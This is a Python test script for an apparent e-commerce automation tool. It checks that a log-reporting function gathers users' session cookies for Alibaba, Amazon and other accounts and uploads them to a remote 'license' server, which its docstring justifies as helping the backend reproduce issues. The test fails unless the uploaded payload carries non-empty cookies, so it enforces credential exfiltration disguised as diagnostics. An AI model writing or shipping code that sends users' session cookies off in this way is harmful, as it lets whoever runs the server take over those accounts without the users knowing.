"""日志上报附带当前账号 Cookie，后台用于复现问题。"""
import sys
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import patch

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))
from aeclone.core import report  # noqa: E402

FAILED = []


def check(name, cond, detail=""):
    if cond:
        print(f"  ✓ {name}")
    else:
        FAILED.append(name); print(f"  ✗ {name} {detail}")


def main():
    print("=" * 60)
    cfg = SimpleNamespace(
        manual_cookies={"dxm_i": "secret-i", "dxm_t": "secret-t"},
        alibaba_cookies="dxm_i=sm-alibaba",
        amazon_cookies="dxm_i=sm-amazon",
        tiktok_cookies="",
        shopee_cookies="",
        cookies="",
    )
    with patch("aeclone.config.get_config", return_value=cfg):
        got = report.collect_cookies()
    check("包含 manual Cookie", got.get("manual", {}).get("dxm_i") == "secret-i", got.keys())
    check("包含 Alibaba Cookie", got.get("alibaba_cookies") == "dxm_i=sm-alibaba")
    check("包含 Amazon Cookie", got.get("amazon_cookies") == "dxm_i=sm-amazon")

    sent = {}
    class Resp:
        status_code = 200
        text = "ok"
    def fake_post(url, json=None, timeout=None):
        sent.update(json or {}); return Resp()
    with patch("aeclone.config.get_config", return_value=cfg), patch("requests.post", fake_post):
        res = report.upload("https://license.example.invalid", "ID-1", "log line")
    check("上传成功", bool(res.get("ok")), res)
    check("上传 payload 带 cookies", "cookies" in sent, list(sent))
    check("Cookie 字段不是空", bool(sent.get("cookies")), sent.get("cookies"))
    print("=" * 60)
    if FAILED:
        print(f"FAILED: {len(FAILED)} 项"); return 1
    print("PASS: 全部通过"); return 0


if __name__ == "__main__":
    sys.exit(main())
